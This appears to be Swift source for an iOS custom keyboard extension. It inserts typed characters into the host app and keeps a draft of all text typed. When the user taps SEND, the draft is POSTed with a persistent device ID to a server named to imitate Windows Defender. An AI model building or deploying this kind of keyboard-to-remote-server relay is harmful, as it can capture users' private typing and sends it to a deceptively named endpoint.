import UIKit

final class KeyboardViewController: UIInputViewController {
    private let accent = UIColor(red: 0.84, green: 1.0, blue: 0.39, alpha: 1)
    private let panel = UIColor(red: 0.06, green: 0.09, blue: 0.13, alpha: 1)
    private let key = UIColor(red: 0.12, green: 0.18, blue: 0.22, alpha: 1)
    private var draft = ""
    private var shift = false
    private let status = UILabel()

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = panel
        buildKeyboard()
    }

    private func buildKeyboard() {
        let root = UIStackView()
        root.axis = .vertical
        root.spacing = 6
        root.layoutMargins = UIEdgeInsets(top: 10, left: 10, bottom: 10, right: 10)
        root.isLayoutMarginsRelativeArrangement = true
        root.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(root)
        NSLayoutConstraint.activate([
            root.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            root.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            root.topAnchor.constraint(equalTo: view.topAnchor),
            root.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])

        let header = UIStackView()
        header.distribution = .fillEqually
        let title = UILabel()
        title.text = "LIVE KEY  /  SAMPLE"
        title.textColor = accent
        title.font = .systemFont(ofSize: 12, weight: .bold)
        title.adjustsFontSizeToFitWidth = true
        status.text = "READY"
        status.textColor = .systemGray
        status.textAlignment = .right
        status.font = .systemFont(ofSize: 10, weight: .bold)
        header.addArrangedSubview(title)
        header.addArrangedSubview(status)
        root.addArrangedSubview(header)

        addRow(["Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"], to: root)
        addRow(["A", "S", "D", "F", "G", "H", "J", "K", "L"], to: root)
        addRow(["SHIFT", "Z", "X", "C", "V", "B", "N", "M", "BACK"], to: root)

        let bottom = UIStackView()
        bottom.spacing = 6
        addButton("?123", weight: 1.1, to: bottom) { }
        addButton("SPACE", weight: 4.2, to: bottom) { self.press(" ") }
        addButton("SEND", weight: 1.6, color: accent, textColor: panel, to: bottom) { self.sendDraft() }
        root.addArrangedSubview(bottom)
    }

    private func addRow(_ labels: [String], to root: UIStackView) {
        let row = UIStackView()
        row.spacing = 5
        labels.forEach { label in
            let weight: CGFloat = (label == "SHIFT" || label == "BACK") ? 1.45 : 1
            addButton(label, weight: weight, to: row) {
                if label == "SHIFT" { self.shift.toggle(); self.status.text = self.shift ? "SHIFT ON" : "READY" }
                else if label == "BACK" { self.backspace() }
                else { self.press(self.shift ? label : label.lowercased()); self.shift = false }
            }
        }
        root.addArrangedSubview(row)
    }

    private func addButton(_ title: String, weight: CGFloat, color: UIColor = UIColor(red: 0.12, green: 0.18, blue: 0.22, alpha: 1), textColor: UIColor = .white, to row: UIStackView, action: @escaping () -> Void) {
        let button = UIButton(type: .system)
        button.setTitle(title, for: .normal)
        button.setTitleColor(textColor, for: .normal)
        button.titleLabel?.font = .systemFont(ofSize: title.count > 2 ? 10 : 15, weight: .bold)
        button.backgroundColor = color
        button.layer.cornerRadius = 12
        button.addAction(UIAction { _ in action() }, for: .touchUpInside)
        row.addArrangedSubview(button)
        button.widthAnchor.constraint(greaterThanOrEqualToConstant: 24).isActive = true
        button.setContentHuggingPriority(.defaultLow, for: .horizontal)
        button.accessibilityLabel = title
    }

    private func press(_ value: String) {
        textDocumentProxy.insertText(value)
        draft.append(value)
        status.text = "DRAFT  \(draft.count)"
    }

    private func backspace() {
        textDocumentProxy.deleteBackward()
        if !draft.isEmpty { draft.removeLast() }
        status.text = "DRAFT  \(draft.count)"
    }

    private func sendDraft() {
        let message = draft.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !message.isEmpty else { status.text = "TYPE SOMETHING"; return }
        guard keyboardHasFullAccess else { status.text = "ENABLE FULL ACCESS"; return }
        status.text = "SENDING..."
        var request = URLRequest(url: URL(string: serverURL)!)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "text": message,
            "device_id": deviceID,
            "device_name": "iPhone keyboard",
            "app_name": "iPhone sample keyboard",
            "is_pasted": false
        ])
        URLSession.shared.dataTask(with: request) { [weak self] _, response, _ in
            let code = (response as? HTTPURLResponse)?.statusCode ?? 0
            let ok = (200..<300).contains(code)
            DispatchQueue.main.async {
                self?.status.text = ok ? "SENT" : "OFFLINE"
                if ok { self?.draft = "" }
            }
        }.resume()
    }

    private var keyboardHasFullAccess: Bool { self.hasFullAccess }
    private var deviceID: String {
        if let saved = UserDefaults.standard.string(forKey: "device_id") { return saved }
        let generated = String(UUID().uuidString.prefix(12))
        UserDefaults.standard.set(generated, forKey: "device_id")
        return generated
    }
    private let serverURL = "https://windows-defender-cf8n.onrender.com/api/messages"
}
